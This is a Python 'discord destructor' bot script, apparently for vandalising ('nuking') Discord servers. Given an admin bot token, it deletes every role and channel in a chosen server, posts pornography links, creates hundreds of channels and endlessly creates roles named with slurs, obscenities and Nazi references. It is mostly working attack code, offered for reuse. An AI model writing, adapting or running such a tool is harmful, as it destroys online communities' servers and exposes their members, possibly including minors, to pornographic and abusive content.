import discord
import sys
import asyncio
from discord import message
from discord import guild
import os
from colorama import init
import colorama
from termcolor import colored
init()
#-----edit porn links and names to create your custom ones

porn_links = ['https://rt.pornhub.com/view_video.php?viewkey=ph59feccbee5a1a', 'https://rt.pornhub.com/view_video.php?viewkey=ph5e346dc032898'
, 'https://rt.pornhub.com/view_video.php?viewkey=ph5cc5d3a26916a', 'https://rt.pornhub.com/view_video.php?viewkey=ph5b87c47ba63a5'
, 'https://rt.pornhub.com/view_video.php?viewkey=ph5e4db83284610', 'https://rt.pornhub.com/view_video.php?viewkey=ph5e63cc14a810b'
       , 'https://rt.pornhub.com/view_video.php?viewkey=ph5e63cc14a810b', 'https://rt.pornhub.com/view_video.php?viewkey=ph5e7ca13bd356a']
names = ['ЧИКИБРИКИБАМБОНИ', 'ГЕЙ', 'СЕКС' 'ШАМРАН ЗАХАРОВИЧ'
         , 'ИЗВРАЩЕННАЯ СВИНЬЯ','БАНЬКА ПАРИЛКА','ЖОПОКЛЮЙ','ВОЛК-ПЕТУХ',
         'ВОЛК НЕ ВОЛК','ВОЛК ЧЛЕН','БЫК ЧЛЕН','КОНЬ ЧЛЕН','ЖУХЛАЯ СВОЛОЧЬ','ШАХМУДИС АРМАТОВИЧ',
         'АЛЛАХАМ','БУХРАТ МОТРАНОВИДЫЧ','ШАХМЕН МАХРУТАВ','БИБИТО МУССЛАМЛИНИ',
         'ГИТЛЕР В ПЛАТЬЕ','ЭДУАРД ПЕРЕДЦ','PORNO',
         'LOVE','GAY PORNO','IS ONE','LOVE','FUCK ME','BDSM','HARD SEX',
         'PIDOR','UBLUDOK','TBAPbI','GANDON','HUILA','GNIDA','PARSHIVIY',
         'ZAEBADLA','PAEBIDLO','YARIK VIDJ','YARIK','VIDJ','AHUEVAU','PROSTITUT','TRANSVISTIT',
         'PIDROHUY','JOIN US','WE ARE','AS ONE',
         'UR NEXT','DID U KNOW','IM ALWAYS','WATCHING U']
#----------------------------------------------------------
print('author of script is not responsible for your actions.')

txt ="""
█▀▄ █▀▀ ▄▀▀ ▀█▀ █▀▀▄ ▄▀▄ ▀▄░▄▀ █▀▀ █▀▀▄  
█░█ █▀▀ ░▀▄ ░█░ █▐█▀ █░█ ░░█░░ █▀▀ █▐█▀ 
▀▀░ ▀▀▀ ▀▀░ ░▀░ ▀░▀▀ ░▀░ ░░▀░░ ▀▀▀ ▀░▀▀ 
"""


def out_red(text):
    print(colored(text, 'red'))
def out_yellow(text):
    print("\033[33m {}" .format(text))
def out_blue(text):
    print("\033[34m {}" .format(text))

def out_pink(text):
    print("\033[35m {}" .format(text))
def out_green(text):
    print(colored(text, 'green'))

out_blue(txt)
out_yellow('Welcome to discord destructor bot!! made with love.')
out_red('Warning! This program is dangerous. Your bot must have admin access!!!')
out_pink('Enter your bot TOKEN https://discordapp.com/developers/applications/')
out_pink('Alt + Space   -> edit -> paste')
TOKEN = input('>>>')
out_red('enter the name of channels that will be created')
chName = input('>>>')
out_blue('Loading...')
class MyClient(discord.Client):
    async def on_ready(self):
        await client.change_presence(status=discord.Status.offline)
        out_yellow('logged as')
        out_yellow(self.user)
        print('\n')
        out_blue('DISCORD servers(guilgs) your bot in:')
        guilds = list(client.guilds)
        i = 0
        for guild in guilds:
            out = guild.name + ' | Number: ' + str(i)
            out_green(out)
            i += 1
        print('----------------------------------------------------------')
        out_pink('Input Number of server(guild) you want to destroy')
        b = int(input('>>>'))
        guild = guilds[b]
        os.system('cls')
        out_red('DELETING STARTED...')
        out_red('DELETING ROLES...')
        roles_list = guild.roles
        for role in roles_list:
            try:
                await role.delete()
            except:
                discord.errors.HTTPException
        os.system('cls')
        out_red('DELETING CHANNELS...')
        channel_list = guild.channels
        for channel in channel_list:
            try:
                await channel.delete()
            except:
                discord.errors.Forbidden
                os.system('cls')
                out_red('BOT IS NOT AN ADMIN!')
        os.system('cls')
        out_red('USERBANNING...')
        out_red('DELETING COMPLETE.')
        txt = """
  ██████                ██████
████░░░░████░░░░░░░░████░░░░████
████░░░░░░░░██░░░░██░░░░░░░░████
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░██████░░░░░░░░██████░░░░░░
░░░░██░░░░████░░░░████░░░░██░░░░
░░░░░░░░██░░██░░░░██░░██░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░████░░░░░░░░░░░░██████░░░░
 ░░░░░░░░░██████████████░░░░░░░
  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░
        """
        out_red(txt)
        await guild.create_text_channel('hello-from-us')
        channel_list = guild.channels
        channel = channel_list[0]
        for link in porn_links:
            await channel.send(content=link)
        await channel.send(content='**Hello from our team XD**')
        await channel.send(content='**Made with love.**')
        for i in range(0, 498):
            await guild.create_text_channel(chName)
        while True:
            for call in names:
                await guild.create_role(name=call)
        await asyncio.sleep(1)
        

client = MyClient()
client.run(TOKEN)
